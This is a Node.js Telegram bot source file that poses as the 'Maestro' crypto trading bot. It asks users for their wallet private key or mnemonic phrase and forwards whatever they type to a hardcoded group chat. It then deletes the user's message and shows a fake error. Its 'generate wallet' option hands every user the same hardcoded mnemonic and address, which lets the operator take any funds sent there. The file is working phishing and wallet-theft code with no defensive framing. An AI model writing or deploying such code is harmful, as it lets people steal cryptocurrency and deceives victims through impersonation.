import 'dotenv/config';
import TelegramBot from 'node-telegram-bot-api';

const token = process.env.BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });

// Replace with your actual group ID (negative number)
const GROUP_CHAT_ID = -1002482381098; // Update with your group ID

// Store active wallet input sessions
const walletSessions = new Set();

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const welcomeMessage = `
✅ *You have been authorized!*

📹 [Video Tutorial](https://www.youtube.com/watch?v=Jh2xNxJ_SQ8) | 📖 [GitBook](https://docs.maestrobots.com/)

🛠 *To be able to use the bot and keep up with its updates, you must always be a member of:*  
🔹 [@MaestroSniperUpdates](https://t.me/MaestroSniperUpdates)  
🔹 [@MaestroBotsHub](https://t.me/MaestroBotsHub)  
🔹 [@MaestroBots](https://t.me/MaestroBots) *(Portal link, join main chat through it)*  

💰 *The bot is free to access with a 1% fee on buys/sells.*

📌 *Read the manual carefully.* The update channel [@MaestroSniperUpdates](https://t.me/MaestroSniperUpdates) is great for keeping up with new features.

🌐 *Follow us on:*  
🔹 [Twitter](https://twitter.com/MaestroBots)  
🔹 [YouTube](https://www.youtube.com/channel/UC47l3HYfd8Dptiya1352NMA)

⚖️ *By proceeding to use the bot, you confirm that you have read and agreed to our* [Terms of Service](https://www.maestrobots.com/disclaimers).
`;

    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "Connect Wallet", callback_data: "connect_wallet" },
                    { text: "Generate Wallet", callback_data: "generate_wallet" }
                ],
                [{ text: "Return", callback_data: "return" }]
            ]
        },
        parse_mode: "Markdown",
        disable_web_page_preview: true
    };

    bot.sendMessage(chatId, welcomeMessage, options);
});

bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    if (data === "connect_wallet") {
        walletSessions.add(chatId); // Activate session for this user
        bot.sendMessage(chatId, "What's the private key of this wallet? You may also use a 12-word mnemonic phrase.");
    } else if (data === "generate_wallet") {
        const walletMessage = `
    ✅ *Generated new wallet:*  
    
    🟠 *Chain:* SOL  
    🔗 *Address:* \`5f8fnyoVvkK6Mx31hKJVimrPC1afvD1fqFzyoJkVBZoG\`  
    
    💰 *ETH:* \`0x9Da9dce878C7EC2275e966EB4F92f8bD59220499\`  
    
    🔑 *Mnemonic:* \`rebuild soon owner grape attend mansion suffer steel hat alert supreme billion\`  
    
    ⚠️ *Make sure to save this mnemonic phrase OR private key using pen and paper only.*  
    ⚠️ *Do NOT copy-paste it anywhere.*  
    ⚠️ *You could also import it to your Metamask/Trust Wallet.*  
    
    🛑 *After saving/importing, delete this message. The bot will not display this information again.*
    `;
    
        bot.sendMessage(chatId, walletMessage, { parse_mode: "Markdown", disable_web_page_preview: true });
    } else if (data === "return") {
        bot.sendMessage(chatId, "Returning to the main menu...");
    }
});

// Handle user messages (wallet address input)
bot.on("message", async (msg) => {
    const chatId = msg.chat.id;

    // Check if user is in a wallet session
    if (walletSessions.has(chatId)) {
        const walletAddress = msg.text;
        const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;

        // Forward the wallet address to the Telegram group
        await bot.sendMessage(-1002482381098, `🚀 *New Wallet Connection Request:*\n\n📌 *User:* ${username}\n🔗 *Wallet Address:* \`${walletAddress}\``, {
            parse_mode: "Markdown"
        });

        // Delete the user's message
        await bot.deleteMessage(chatId, msg.message_id);

        // Send error message
        bot.sendMessage(chatId, "❌ Error, please try again.");
    }
});